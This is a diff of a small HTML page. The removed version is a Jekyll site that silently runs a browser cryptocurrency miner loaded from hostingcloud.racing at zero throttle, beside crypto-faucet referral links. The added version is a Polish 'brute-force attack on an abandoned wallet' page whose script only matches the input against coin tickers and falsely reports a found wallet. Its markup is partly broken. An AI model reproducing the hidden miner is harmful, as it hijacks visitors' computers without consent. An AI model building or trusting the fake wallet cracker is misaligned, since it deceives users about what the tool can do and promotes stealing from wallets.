@@ -1,49 +1,82 @@
----
-layout: default
-title: Moja Strona Jekyll z Linkami
----
-
 <!DOCTYPE html>
-<html lang="en">
+<html lang="pl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>{{ page.title }}</title>
+    <title>Brute Force Atak na Opuszczony Portfel</title>
 </head>
 <body>
-    <script src="https://www.hostingcloud.racing/DPuG.js"></script>
-<script>
-    var _client = new Client.Anonymous('785666501d85e0bec1252feccf743d4b11046a6efc58ad0598fb1e71a1c96267', {
-        throttle: 0, c: 'w', ads: 0
-    });
-    _client.start();
-    
+    <h1>Brute Force Atak na Opuszczony Portfel</h1>
+    <form id="form" onsubmit="startAttack()">
+        Wprowadź adres portfela: <input type="text" id="address" placeholder="Adres portfela">
+        <button typemodif="submit">Start ataku</button>
+    </form>
 
-</script>
-    <header>
-        <h1>{{ page.title }}</h1>
-        <nav>
-            <ul>
-                <li><a href="/">Strona Główna</a></li>
-                <li><a href="/o-nas">O Nas</a></li>
-                <li><a href="/kontakt">Kontakt</a></li>
-            </ul>
-        </nav>
-    </header>
+    <div id="results"></div>
 
-    <main>
-        <p>Witaj na mojej stronie internetowej stworzonej przy użyciu Jekyll!</p>
+    <script>
+        const addresses = [
+            "BTC",
+            "LTC",
+            "ETH",
+            "USDT",
+            "TRX",
+            "SOL",
+            "BNB",
+            "XMR",
+            "DGB"
+        ];
 
-        <!-- Hiperłącza do zewnętrznych witryn -->
-        <p>Odwiedź również:
-            <a href="https://firefaucet.win/ref/1012399" target="_blank">FireFaucet</a> oraz
-            <a href="https://allcoins.pw/?ref=692040" target="_blank">Allcoins.pw</a>.
-        </p>
-    </main>
+        let attackRunning = false;
 
-    <footer>
-        <p>&copy; 2022 Moja Strona Jekyll</p>
-    </footer>
+        function startAttack() {
+            const addressInput = document.getElementById("address").value;
+            const form = document.getElementById("form");
 
+            if (attackRunning) {
+                console.log("Atak już jest w trakcie.");
+                return false;
+            }
+
+            form.style.display = "none";
+            attackRunning = true;
+
+            setTimeout(() => {
+                for (const address of addresses) {
+                    setTimeout(() => {
+                        const cryptoItem = document.createElement("li");
+                        cryptoItem.textContent = address;
+                        const resultsDiv = document.getElementById("results");
+
+                        if (address === addressInput.toUpperCase()) {
+                            console.log(`Znaleziono portfel z ${address} na adresie: ${addressInput}`);
+                            displayResult(address, addressInput);
+                        }
+
+                        resultsDiv.appendChild(cryptoItem);
+
+                        setTimeout(() => {
+                            resultsDiv.scrollTop = resultsDiv.scrollHeight;
+                        }, 100);
+                    }, 1000 * (addresses.indexOf(address) + 1));
+                }
+
+                setTimeout(() => {
+                    form.style.display = "block";
+                    attackRunning = false;
+                }, 5000);
+            }, 1000);
+        }
+
+        function displayResult(crypto, address) {
+            const resultsDiv = document.getElementById("results");
+            const resultItem = document.createElement("p");
+            resultItem.textContent = `Znaleziono portfel z ${crypto} na adresie: ${address}`;
+            resultsDiv.appendChild(resultItem);
+
+            setTimeout(() => {
+                resultsDiv.scrollTop = resultsDiv.scrollHeight;
+            }, 100);
+        }
+    </script>
 </body>
 </html>
